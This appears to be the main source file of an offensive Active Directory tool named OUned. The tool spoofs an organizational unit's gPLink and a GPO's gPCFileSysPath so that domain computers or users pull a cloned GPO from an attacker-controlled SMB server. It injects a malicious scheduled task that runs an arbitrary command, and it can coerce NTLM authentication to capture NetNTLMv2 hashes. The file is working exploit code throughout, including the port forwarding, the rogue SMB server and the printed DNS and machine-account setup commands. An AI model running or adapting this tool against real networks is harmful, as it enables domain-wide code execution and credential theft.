import sys
import time
import typer
import socket
import logging
import traceback
import configparser
import dns.resolver

import _thread                      as thread
import helpers.forwarder            as forwarder

from time                           import sleep
from ldap3                          import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES
from impacket.ntlm                  import compute_lmhash, compute_nthash
from typing_extensions              import Annotated
from helpers.smb_utils              import get_smb_connection, download_initial_gpo, upload_directory_to_share, recursive_smb_delete
from helpers.clean_utils            import init_save_file, save_attribute_value, clean
from helpers.ldap_utils             import get_attribute, modify_attribute, update_extensionNames, ldap_check_credentials
from helpers.scheduledtask_utils    import write_scheduled_task
from helpers.version_utils          import update_GPT_version_number
from helpers.ouned_smbserver        import SimpleSMBServer      

from conf                           import bcolors, OUTPUT_DIR, GPOTypes, SMBModes


def main(
    config: Annotated[str, typer.Option("--config", help="The configuration file for OUned")],
    skip_checks: Annotated[bool, typer.Option("--skip-checks", help="Do not perform the various checks related to the exploitation setup")] = False,
    just_coerce: Annotated[bool, typer.Option("--just-coerce", help="Only coerce SMB NTLM authentication of OU child objects to the destination specified in the --coerce-to flag, or, if no destination is specified, to a local SMB server that will print their NetNTLMv2 hashes")] = False,
    coerce_to: Annotated[str, typer.Option("--coerce-to", help="Coerce child objects SMB NTLM authentication to a specific destination - this argument should be an IP address")] = None,
    just_clean: Annotated[bool, typer.Option("--just-clean", help="This flag indicates that OUned should only perform cleaning actions from specified cleaning-file")] = False,
    cleaning_file: Annotated[str, typer.Option("--cleaning-file", help="The path to the cleaning file in case the --just-clean flag is used")] = None,
    verbose: Annotated[bool, typer.Option("--verbose", help="Enable verbose output")] = False
):
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)
    logger = logging.getLogger(__name__)


    ### ============================ ###
    ### Handling the just-clean case ###
    ### ============================ ###
    if just_clean is True:
        logger.warning(f"\n\n{bcolors.BOLD}=== ATTEMPTING TO CLEAN FROM SPECIFIED FILE AND EXITING ==={bcolors.ENDC}")
        options = configparser.ConfigParser()
        options.read(config)

        if "ldaps" in options["GENERAL"].keys() and options["GENERAL"]["ldaps"].lower() == "true":
            ldaps = True
        else:
            ldaps = False

        target_domain_ldap_session = None
        ldap_server_ldap_session = None
        if "username" in options["GENERAL"].keys() and options["GENERAL"]["username"]:
            username = options["GENERAL"]["username"]
            domain = options["GENERAL"]["domain"]
            if "password" in options["GENERAL"].keys() and options["GENERAL"]["password"]:
                password = options["GENERAL"]["password"]
                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
                target_domain_ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
            elif "hash" in options["GENERAL"].keys() and options["GENERAL"]["hash"]:
                hash = options["GENERAL"]["hash"]
                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
                target_domain_ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)

        if "ldap_username" in options["LDAP"].keys() and options["LDAP"]["ldap_username"] and "ldap_password" in options["LDAP"].keys() and options["LDAP"]["ldap_password"]:
            ldap_ip = options["LDAP"]["ldap_ip"]
            ldap_machine_name = options["LDAP"]["ldap_machine_name"]
            ldap_username = options["LDAP"]["ldap_username"]
            ldap_password = options["LDAP"]["ldap_password"]
            server = Server(f'ldap://{ldap_ip}:389', port = 389, use_ssl = False)
            ldap_server_ldap_session = Connection(server, user=f"{ldap_machine_name[:-1].lower()}.{domain}\\{ldap_username}", password=ldap_password, authentication=NTLM, auto_bind=True)

        clean(target_domain_ldap_session, ldap_server_ldap_session, cleaning_file)
        return

    ### ===================================== ###
    ### Performing arguments coherence checks ###
    ### ===================================== ###
    try:    
        options = configparser.ConfigParser()
        options.read(config)

        # These arguments are required - we can't perform the exploit without them
        required_options = {"GENERAL": ["domain", "ou", "username", "attacker_ip", "command", "target_type"],
                            "LDAP": ["ldap_ip", "ldap_username", "ldap_password", "gpo_id", "ldap_machine_name", "ldap_machine_password"],
                            "SMB": ["smb_mode"]}
        for section in required_options.keys():
            for option in required_options[section]:
                if option not in options[section].keys() or not options[section][option]:
                    logger.error(f"{bcolors.FAIL}[!] The {section}>{option} option is required. It must be defined and non-empty in configuration file.")
                    raise SystemExit
        
        # Assigning required options to variables
        domain = options["GENERAL"]["domain"]
        ou = options["GENERAL"]["ou"]
        username = options["GENERAL"]["username"]
        attacker_ip = options["GENERAL"]["attacker_ip"]
        command = options["GENERAL"]["command"]
        target_type = options["GENERAL"]["target_type"].lower()
        ldap_ip = options["LDAP"]["ldap_ip"]
        ldap_username = options["LDAP"]["ldap_username"]
        ldap_password = options["LDAP"]["ldap_password"]
        gpo_id = options["LDAP"]["gpo_id"]
        ldap_machine_name = options["LDAP"]["ldap_machine_name"]
        ldap_machine_password = options["LDAP"]["ldap_machine_password"]
        smb_mode = options["SMB"]["smb_mode"].lower()

        # These options should have specific accepted values
        if target_type != "computer" and target_type != "user":
            logger.error(f"{bcolors.FAIL}[!] The GENERAL>target_type option can only be 'user' or 'computer'.{bcolors.ENDC}")
            raise SystemExit
        if smb_mode != "embedded" and smb_mode != "forwarded":
            logger.error(f"{bcolors.FAIL}[!] The SMB>smb_mode option can only be 'embedded' or 'forwarded'.{bcolors.ENDC}")
            raise SystemExit

        # We should have at least a "password" or a "hash" option. If both are defined, the password will be used
        if "password" in options["GENERAL"].keys() and options["GENERAL"]["password"]:
            password = options["GENERAL"]["password"]
            hash = None
        elif "hash" in options["GENERAL"].keys() and options["GENERAL"]["hash"]:
            hash = options["GENERAL"]["hash"]
        else:
            logger.error(f"{bcolors.FAIL}[!] Need at least one of GENERAL>password / GENERAL/hash.{bcolors.ENDC}")
            raise SystemExit

        # If LDAPS is equal to True, we will use LDAPS ; else, we use LDAP
        if "ldaps" in options["GENERAL"].keys() and options["GENERAL"]["ldaps"].lower() == "true":
            ldaps = True
        else:
            ldaps = False
        
        # If an LDAP hostname was defined, assign it ; else, initialize variable as None
        if "ldap_hostname" in options["LDAP"].keys() and options["LDAP"]["ldap_hostname"]:
            ldap_hostname = options["LDAP"]["ldap_hostname"]
        else:
            ldap_hostname = None

        # If the user provided a share name, we will use it ; otherwise, default to 'share'
        if "share_name" in options["SMB"].keys() and options["SMB"]["share_name"]:
            smb_share_name = options["SMB"]["share_name"]
        else:
            smb_share_name = 'share'

        # If the user wants the 'forwarded' SMB mode ...
        if smb_mode == 'forwarded':
            # ... we should have an SMB IP to forward to
            if "smb_ip" not in options["SMB"] or not options["SMB"]["smb_ip"]:
                logger.error(f"{bcolors.FAIL}[!] When using the SMB>smb_mode 'forwarded', you need to provide the SMB>smb_ip option.{bcolors.ENDC}")
                raise SystemExit
            else:
                smb_ip = options["SMB"]["smb_ip"]

            # ... We will take the smb_username and smb_password values if they exist, or default to LDAP username and password values
            if "smb_username" in options["SMB"].keys() and options["SMB"]["smb_username"]:
                smb_username = options["SMB"]["smb_username"]
            else:
                smb_username = ldap_username
            if "smb_password" in options["SMB"].keys() and options["SMB"]["smb_password"]:
                smb_password = options["SMB"]["smb_password"]
            else:
                smb_password = ldap_password

            # ... We should have an SMB machine account and its associated password
            if "smb_machine_name" not in options["SMB"] or not options["SMB"]["smb_machine_name"]:
                logger.error(f"{bcolors.FAIL}[!] When using the SMB>smb_mode 'forwarded', you need to provide the SMB>smb_machine_name option.{bcolors.ENDC}")
                raise SystemExit
            elif "smb_machine_password" not in options["SMB"] or not options["SMB"]["smb_machine_password"]:
                logger.error(f"{bcolors.FAIL}[!] When using the SMB>smb_mode 'forwarded', you need to provide the SMB>smb_machine_password option.{bcolors.ENDC}")
                raise SystemExit
            else:
                smb_machine_name = options["SMB"]["smb_machine_name"]
                smb_machine_password = options["SMB"]["smb_machine_password"]

        # If the target type is user and we are using smb embedded mode, display a warning
        if target_type == "user" and smb_mode == "embedded" and just_coerce is not True:
            confirmation = typer.prompt(f"{bcolors.WARNING}[?] You are trying to target user objects while using embedded SMB mode, which will not work. Do you still want to continue ? [yes/no] {bcolors.ENDC}")
            if confirmation.lower() != 'yes':
                raise SystemExit


    except SystemExit:
        sys.exit(1)
    except:
        logger.error(f"{bcolors.FAIL}[!] Unhandled exception while performing configuration options checks on file {config}. Is the file correctly formated ?{bcolors.ENDC}")
        traceback.print_exc()
        sys.exit(1)

    
    domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
    computer_dn = "CN=Computers," + domain_dn
    ldap_domain = f"{ldap_machine_name[:-1].lower()}.{domain}"
    ldap_domain_dn = f"DC={ldap_machine_name[:-1]},{domain_dn}"

    if skip_checks is False:
        logger.warning(f"\n\n{bcolors.BOLD}=== PERFORMING VARIOUS SANITY CHECKS RELATED TO THE SETUP ==={bcolors.ENDC}")
        ### ==================================================== ###
        ### Verifying the existence of the LDAP computer account ###
        ### ==================================================== ###
        try:
            server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
            check_session = Connection(server, user=f"{domain}\\{ldap_machine_name}", password=ldap_machine_password, authentication=NTLM, auto_bind=True)
        except:
            traceback.print_exc()
            logger.error(f"{bcolors.FAIL}[!] Could not authenticate with provided LDAP machine account {ldap_machine_name} on target domain. You may want to run the following command:{bcolors.ENDC}")
            logger.error(f"python3 addcomputer_with_spns.py -computer-name {ldap_machine_name} -computer-pass '{ldap_machine_password}' -method LDAPS '{domain}/{username}:{password}'")
            sys.exit(1)
        logger.warning(f"{bcolors.OKGREEN}[+] LDAP computer account {ldap_machine_name} valid in target domain.{bcolors.ENDC}")


        ### ================================================================================= ###
        ### Verifying the existence of the SMB computer account in case of forwarded SMB mode ###
        ### ================================================================================= ###
        if smb_mode == "forwarded":
            try:
                server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
                check_session = Connection(server, user=f"{domain}\\{smb_machine_name}", password=smb_machine_password, authentication=NTLM, auto_bind=True)
            except:
                traceback.print_exc()
                logger.error(f"{bcolors.FAIL}[!] Could not authenticate with provided SMB machine account {smb_machine_name} on target domain. You may want to run the following command:{bcolors.ENDC}")
                logger.error(f"python3 addcomputer.py -computer-name {smb_machine_name} -computer-pass '{smb_machine_password}' -method LDAPS '{domain}/{username}:{password}'")
                sys.exit(1)
            logger.warning(f"{bcolors.OKGREEN}[+] SMB computer account {smb_machine_name} valid in target domain.{bcolors.ENDC}")


        ### ============================= ###
        ### Verifying the LDAP DNS record ###
        ### ============================= ###
        try:
            dns_result = socket.gethostbyname(f'{ldap_machine_name[:-1]}.{domain}')
        except socket.error:
            logger.error(f"{bcolors.FAIL}[!] Could not resolve {ldap_machine_name[:-1]}.{domain} to an IP address. If you did not add the expected DNS record, you may want to run the following command:{bcolors.ENDC}")
            logger.error(f'python3 dnstool.py -u \'{domain}\\{username}\' -p \'{password}\' -r \'{ldap_machine_name[:-1]}\' -a add -d "{attacker_ip}" "{domain}"')
            sys.exit(1)

        if dns_result != attacker_ip:
            logger.error(f"{bcolors.FAIL}[!] The DNS record for {ldap_machine_name[:-1]}.{domain} ({dns_result}) does not match the provided attacker-ip parameter ({attacker_ip}). The attack will not work.{bcolors.ENDC}")
            logger.error(f"You may want to delete the existing DNS record, and run the following command:")
            logger.error(f'python3 dnstool.py -u \'{domain}\\{username}\' -p \'{password}\' -r \'{ldap_machine_name[:-1]}\' -a add -d "{attacker_ip}" "{domain}"')
            sys.exit(1)
        logger.warning(f"{bcolors.OKGREEN}[+] The DNS record {ldap_machine_name[:-1]}.{domain} exists and matches the provided attacker IP address ({attacker_ip}){bcolors.ENDC}")
        

        ### ===================================================== ###
        ### Verifying the SMB DNS record in case of forwarded SMB ###
        ### ===================================================== ###
        if smb_mode == "forwarded":
            try:
                dns_result = socket.gethostbyname(f'{smb_machine_name[:-1]}.{domain}')
            except socket.error:
                logger.error(f"{bcolors.FAIL}[!] Could not resolve {smb_machine_name[:-1]}.{domain} to an IP address. If you did not add the expected DNS record, you may want to run the following command:{bcolors.ENDC}")
                logger.error(f'python3 dnstool.py -u \'{domain}\\{username}\' -p \'{password}\' -r \'{smb_machine_name[:-1]}\' -a add -d "{attacker_ip}" "{domain}"')
                sys.exit(1)

            if dns_result != attacker_ip:
                logger.error(f"{bcolors.FAIL}[!] The DNS record for {smb_machine_name[:-1]}.{domain} ({dns_result}) does not match the provided attacker-ip parameter ({attacker_ip}). The attack will not work.{bcolors.ENDC}")
                logger.error(f"You may want to delete the existing DNS record, and run the following command:")
                logger.error(f'python3 dnstool.py -u \'{domain}\\{username}\' -p \'{password}\' -r \'{smb_machine_name[:-1]}\' -a add -d "{attacker_ip}" "{domain}"')
                sys.exit(1)
            logger.warning(f"{bcolors.OKGREEN}[+] The DNS record {smb_machine_name[:-1]}.{domain} exists and matches the provided attacker IP address ({attacker_ip}){bcolors.ENDC}")



        ### ====================================== ###
        ### Verifying the password synchronization ###
        ### ====================================== ###
        '''
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [ldap_ip]
            answers = resolver.resolve(f"_ldap._tcp.{ldap_domain}", 'SRV')
            parsed = str(answers[0].target).split(".", 1)
            ldap_check_hostname = parsed[0]
        except:
            logger.error(f"{bcolors.FAIL}[!] Could not resolve _ldap._tcp.{ldap_domain}. Are you sure the domain name of your LDAP server is {ldap_domain} as expected ?{bcolors.ENDC}")
            confirmation = typer.prompt("[?] Do you still want to continue ? (I will not be able to check that the password of the LDAP server is the same as the machine account) [yes/no] ")
            if confirmation.lower() != 'yes':
                sys.exit(1)
        '''
        
        # Check if we can login to LDAP server
        if ldap_hostname is not None:
            if ldap_check_credentials(ldap_ip, f"{ldap_hostname.upper()}$" if not ldap_hostname.endswith('$') else f"{ldap_hostname.upper()}", ldap_machine_password, ldap_domain) is False:
                logger.error(f"{bcolors.FAIL}[!] Could not establish an LDAP session with the LDAP server for the DC hostname and the machine password. Are you sure the LDAP server has the password {ldap_machine_password} ?{bcolors.ENDC}")
                confirmation = typer.prompt("[?] Do you still want to continue ? Things may break [yes/no] ")
                if confirmation.lower() != 'yes':
                    sys.exit(1)
            logger.warning(f"{bcolors.OKGREEN}[+] Successfully authenticated to LDAP server with DC account and LDAP machine_password. LDAP and machine account passwords are synchronized.{bcolors.ENDC}")
        
        # For the SMB server, only perform checks if we are in "forwarded" mode
        if smb_mode == "forwarded" and just_coerce is False:
            '''
            try:
                # Check if the SMB domain controller matches the machine account DNS record of target domain
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [smb_ip]
                answers = resolver.resolve(f"_ldap._tcp.{domain}", 'SRV')
                parsed = str(answers[0].target).split(".", 1)
                smb_check_hostname = parsed[0]
            except:
                logger.error(f"{bcolors.FAIL}[!] Could not resolve _ldap._tcp.{domain} with SMB nameserver. Are you sure the domain name of your SMB server is {domain} as expected ?{bcolors.ENDC}")
            
            if smb_check_hostname is not None and smb_check_hostname != machine_name[:-1]:
                logger.error(f"{bcolors.FAIL}[!] Resolved SMB server hostname ({smb_check_hostname}) is not {machine_name[:-1]} as expected ?{bcolors.ENDC}")
                failure = True
            '''
            # Check if we can login to SMB server
            if ldap_check_credentials(smb_ip, f"{smb_machine_name}", smb_machine_password, domain) is False:
                logger.error(f"{bcolors.FAIL}[!] Could not establish an LDAP session with the SMB server for the DC hostname and the SMB machine password. Are you sure the SMB server has the password {smb_machine_password} ?{bcolors.ENDC}")
                confirmation = typer.prompt("[?] Do you still want to continue ? (things may break) [yes/no] ")
                if confirmation.lower() != 'yes':
                    sys.exit(1)
            else:
                logger.warning(f"{bcolors.OKGREEN}[+] Successfully authenticated to SMB server with DC account and SMB machine_password. SMB server and SMB machine account passwords are synchronized.{bcolors.ENDC}")



    ### ============================================ ###
    ### Launching port forwarding server in a thread ###
    ### ============================================ ###
    logger.warning(f"\n\n{bcolors.BOLD}=== SETTING UP PORT FORWARDING ==={bcolors.ENDC}")
    logger.warning(f"[*] Creating LDAP port forwarding. All traffic incoming on port 389 on attacker machine ({attacker_ip}) should be redirected on port 389 of the fake LDAP server ({ldap_ip})")
    forwarder_settings = (attacker_ip, 389, ldap_ip, 389)
    thread.start_new_thread(forwarder.server, forwarder_settings)
    logger.warning(f"{bcolors.OKGREEN}[+] Created port forwarding ({attacker_ip}:389 -> {ldap_ip}:389){bcolors.ENDC}")

    if smb_mode == "forwarded" and just_coerce is not True:
        logger.warning(f"\n[*] Creating SMB port forwarding. All traffic incoming on port 445 on attacker machine ({attacker_ip}) should be redirected on port 445 of the fake SMB server ({smb_ip})")
        forwarder_settings = (attacker_ip, 445, smb_ip, 445)
        thread.start_new_thread(forwarder.server, forwarder_settings)
        logger.warning(f"{bcolors.OKGREEN}[+] Created port forwarding ({attacker_ip}:445 -> {ldap_ip}:445){bcolors.ENDC}")


    ### ================================================================================== ###
    ### Cloning the rogue DC GPO, add an immediate task to it, and store it in GPT_out     ###
    ### Spoofing the gPCFileSysPath attribute of the cloned GPO, and update its extensions ###
    ### ================================================================================== ###
    logger.warning(f"\n\n{bcolors.BOLD}=== PERFORMING GPO OPERATIONS (CLONING, INJECTING SCHEDULED TASK, UPLOADING TO SMB SERVER IF NEEDED) ==={bcolors.ENDC}")
    save_file_name = init_save_file(ou)
    logger.info(f"[*] The save file for current exploit run is {save_file_name}")

    logger.warning(f"[*] Cloning GPO {gpo_id} from fakedc {ldap_ip}.")
    try:
        smb_session = get_smb_connection(ldap_ip, ldap_username, ldap_password, None, ldap_domain)
        download_initial_gpo(smb_session, ldap_domain, gpo_id)
    except:
        logger.critical(f"{bcolors.FAIL}[!] Failed to download GPO from fakedc (ldap_ip: {ldap_ip} ; ldap_username: {ldap_username} ; ldap_password: {ldap_password} ; fakedc domain: {ldap_domain}). Exiting...{bcolors.ENDC}", exc_info=True)
        sys.exit(1)

    logger.warning(f"{bcolors.OKGREEN}[+] Successfully downloaded GPO from fakedc to '{OUTPUT_DIR}' folder.{bcolors.ENDC}")

    logger.warning(f"[*] Injecting malicious scheduled task into downloaded GPO")
    try:
        write_scheduled_task(target_type, command, False)
    except:
        logger.critical(f"{bcolors.FAIL}[!] Failed to write malicious scheduled task to downloaded GPO. Exiting...{bcolors.ENDC}", exc_info=True)
        sys.exit(1)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task.{bcolors.ENDC}")
    

    try:
        gpo_dn = 'CN={' + gpo_id + '}},CN=Policies,CN=System,{}'.format(ldap_domain_dn)
        ldap_server = Server(f'ldap://{ldap_ip}:389', port = 389, use_ssl = False)
        ldap_server_session = Connection(ldap_server, user=f"{ldap_domain}\\{ldap_username}", password=ldap_password, authentication=NTLM, auto_bind=True)
        if smb_mode == "embedded" or just_coerce is True:
            if just_coerce is True and coerce_to is not None:
                smb_path = f'\\\\{coerce_to}\\{smb_share_name}'
            else:
                smb_path = f'\\\\{attacker_ip}\\{smb_share_name}'
        else:
            smb_path = f'\\\\{smb_machine_name[:-1].lower()}.{domain}\\{smb_share_name}'

        initial_gpcfilesyspath = get_attribute(ldap_server_session, gpo_dn, "gPCFileSysPath")
        logger.warning(f"[*] Modifying gPCFileSysPath attribute of GPO on fakedc to {smb_path} (initial value saved: {initial_gpcfilesyspath})")
        result = modify_attribute(ldap_server_session, gpo_dn, "gPCFileSysPath", smb_path)
        if result is not True: raise Exception
    except:
        print(traceback.print_exc())
        logger.critical(f"{bcolors.FAIL}[!] Failed to modify the gPCFileSysPath attribute of the fakedc GPO. Exiting...{bcolors.ENDC}")
        sys.exit(1)
    save_attribute_value("gPCFileSysPath", initial_gpcfilesyspath, save_file_name, "ldap_server", gpo_dn)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated gPCFileSysPath attribute of fakedc GPO.{bcolors.ENDC}")


    try:
        attribute_name = "gPCMachineExtensionNames" if target_type == "computer" else "gPCUserExtensionNames"
        extensionName = get_attribute(ldap_server_session, gpo_dn, attribute_name)
        updated_extensionName = update_extensionNames(extensionName)
        logger.warning(f"[*] Modifying {attribute_name} attribute of GPO on fakedc to {updated_extensionName}")
        result = modify_attribute(ldap_server_session, gpo_dn, attribute_name, updated_extensionName)
        if result is not True: raise Exception
    except:
        print(traceback.print_exc())
        logger.critical(f"{bcolors.FAIL}[!] Failed to modify the GPC extension names for the fakedc GPO. Cleaning and exiting...{bcolors.ENDC}")
        clean(None, ldap_server_session, save_file_name)
        sys.exit(1)
    save_attribute_value(attribute_name, extensionName, save_file_name, "ldap_server", gpo_dn)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated extension names of fakedc GPO.{bcolors.ENDC}")

    try:
        logger.warning(f"[*] Incrementing fakedc GPO version number (GPC and cloned GPT). This is actually mainly to ensure it is not 0...")
        versionNumber = int(get_attribute(ldap_server_session, gpo_dn, "versionNumber"))
        updated_version = versionNumber + 1 if target_type == "computer" else versionNumber + 65536
        result = modify_attribute(ldap_server_session, gpo_dn, "versionNumber", updated_version)
        update_GPT_version_number(ldap_server_session, gpo_dn, target_type)
    except:
        print(traceback.print_exc())
        logger.critical(f"{bcolors.FAIL}[!] Failed to modify GPC/GPT version number of fakedc GPO.{bcolors.ENDC}")
        logger.critical("[*] Continuing...")
    save_attribute_value("versionNumber", versionNumber, save_file_name, "ldap_server", gpo_dn)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC versionNumber attribute{bcolors.ENDC}")


    ### ================================================== ###
    ### For forwarded SMB, writing GPO to SMB server share ###
    ### ================================================== ###
    if smb_mode == "forwarded" and just_coerce is not True:
        try:
            smb_session_smb = get_smb_connection(smb_ip, smb_username, smb_password, None, domain)
            recursive_smb_delete(smb_session_smb, smb_share_name, '*')
            upload_directory_to_share(smb_session_smb, smb_share_name)
        except:
            traceback.print_exc()
            logger.critical(f"{bcolors.FAIL}[!] Failed to upload GPO to SMB server.{bcolors.ENDC}")
            clean(None, ldap_server_session, save_file_name)
            sys.exit(1)
        logger.warning(f"{bcolors.OKGREEN}[+] Successfully uploaded GPO to SMB server {smb_ip}, on share {smb_share_name}.{bcolors.ENDC}")

    ### ============================================== ###
    ### Spoofing the gPLink attribute of the target OU ###
    ### ============================================== ###
    logger.warning(f"\n\n{bcolors.BOLD}=== SPOOFING THE GPLINK ATTRIBUTE OF THE TARGET OU ==={bcolors.ENDC}")
    try:
        server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
        ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
    except:
        print(traceback.print_exc())
        logger.critical(f"{bcolors.FAIL}[!] Could not establish an LDAP connection to target domain with provided credentials ({domain}\{username}:{password}).{bcolors.ENDC}")
        clean(ldap_session, ldap_server_session, save_file_name)
        sys.exit(1)

    logger.warning(f"[*] Searching the target OU '{ou}'.")
    search_filter = f'(ou={ou})'
    attributes = [ALL_ATTRIBUTES]
    ldap_session.search(domain_dn, search_filter, SUBTREE, attributes=attributes)
    ldap_entries = len(ldap_session.entries)
    if ldap_entries == 1:
        ou_dn = ldap_session.entries[0].entry_dn
        logger.warning(f"{bcolors.OKGREEN}[+] Organizational unit found - {ou_dn}.{bcolors.ENDC}")
    elif ldap_entries >= 2:
        logger.warning(f"{bcolors.OKBLUE}[+] Several OUs matching this name have been found.{bcolors.ENDC}")
        numEntry = 0
        for entry in ldap_session.entries:
            logger.warning(f"{bcolors.OKBLUE}[+] {numEntry+1} :  {entry.entry_dn}.{bcolors.ENDC}")
            numEntry+=1
        targetEntry = input(f"{bcolors.OKBLUE}[+] Select which OU you want to target : {bcolors.ENDC}")
        try: 
            targetEntry = int(targetEntry)
            if(targetEntry > ldap_entries):
                raise Exception
        except:
            logger.critical(f"{bcolors.FAIL}[!] Failed to select target OU.{bcolors.ENDC}")
            clean(ldap_session, ldap_server_session, save_file_name)
            sys.exit(1)
        
        ou_dn = ldap_session.entries[targetEntry-1].entry_dn
        logger.warning(f"{bcolors.OKGREEN}[+] The OU has been successfully targeted. - {ou_dn}.{bcolors.ENDC}") 

    else:
        logger.error(f"{bcolors.FAIL}[!] Could not find Organizational Unit with name {ou}.{bcolors.ENDC}")
        clean(ldap_session, ldap_server_session, save_file_name)
        sys.exit(1)
    
    logger.warning(f"[*] Retrieving the initial gPLink value to prepare for cleaning.")

    try:
        spoofed_gPLink = f"[LDAP://cn={{{gpo_id}}},cn=policies,cn=system,{ldap_domain_dn};0]"
        initial_gPLink = get_attribute(ldap_session, ou_dn, "gPLink")
        logger.warning(f"[*] Initial gPLink is {initial_gPLink}.")
        if str(initial_gPLink) != '[]':
            spoofed_gPLink = str(initial_gPLink) + spoofed_gPLink
        logger.warning(f"[*] Spoofing gPLink to {spoofed_gPLink}")
        result = modify_attribute(ldap_session, ou_dn, 'gPLink', spoofed_gPLink)
        if result is not True: raise Exception
    except:
        print(traceback.print_exc())
        logger.critical(f"{bcolors.FAIL}[!] Failed to modify the gPLink attribute of the target OU with provided user.{bcolors.ENDC}")
        clean(ldap_session, ldap_server_session, save_file_name)
        sys.exit(1)
    save_attribute_value("gPLink", initial_gPLink, save_file_name, "domain", ou_dn)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed gPLink for OU {ou_dn}{bcolors.ENDC}")


    

    ### ======================== ###
    ### Launching GPT SMB server ###
    ### ======================== ###
    try:
        if just_coerce is True and coerce_to is not None:
            logger.warning(f"\n{bcolors.BOLD}=== WAITING (SMB NTLM AUTHENTICATION COERCED TO {smb_path}) ==={bcolors.ENDC}")
            while True:
                sleep(30)

        elif smb_mode == "embedded" or just_coerce is True:
            logger.warning(f"\n{bcolors.BOLD}=== LAUNCHING SMB SERVER AND WAITING FOR GPT REQUESTS ==={bcolors.ENDC}")
            logger.warning(f"\n{bcolors.BOLD}If the attack is successful, you will see authentication logs of machines retrieving and executing the malicious GPO{bcolors.ENDC}")
            logger.warning(f"{bcolors.BOLD}Type CTRL+C when you're done. This will trigger cleaning actions{bcolors.ENDC}\n")

            lmhash = compute_lmhash(ldap_machine_password)
            nthash = compute_nthash(ldap_machine_password)

            server = SimpleSMBServer(listenAddress=attacker_ip,
                                                    listenPort=445,
                                                    domainName=domain,
                                                    machineName=ldap_machine_name,
                                                    netlogon=False if just_coerce is True else True)
            server.addShare(smb_share_name.upper(), OUTPUT_DIR, '')
            server.setSMB2Support(True)
            server.addCredential(ldap_machine_name, 0, lmhash, nthash)
            server.setSMBChallenge('')
            server.setLogFile('')
            server.start()
        
        else:
            logger.warning(f"\n{bcolors.BOLD}=== WAITING (GPT REQUESTS WILL BE FORWARDED TO SMB SERVER) ==={bcolors.ENDC}")
            while True:
                sleep(30)

    except KeyboardInterrupt:
        logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
        # Reinitialize ldap connections, since cleaning can happen long after exploit launch
        server = Server(f'ldaps://{domain}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{domain}:389', port = 389, use_ssl = False)
        if hash is not None:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        ldap_server = Server(f'ldap://{ldap_ip}:389', port = 389, use_ssl = False)
        ldap_server_session = Connection(ldap_server, user=f"{ldap_domain}\\{ldap_username}", password=ldap_password, authentication=NTLM, auto_bind=True)
        clean(ldap_session, ldap_server_session, save_file_name)
    

def entrypoint():
    typer.run(main)

    
if __name__ == "__main__":
    typer.run(main)
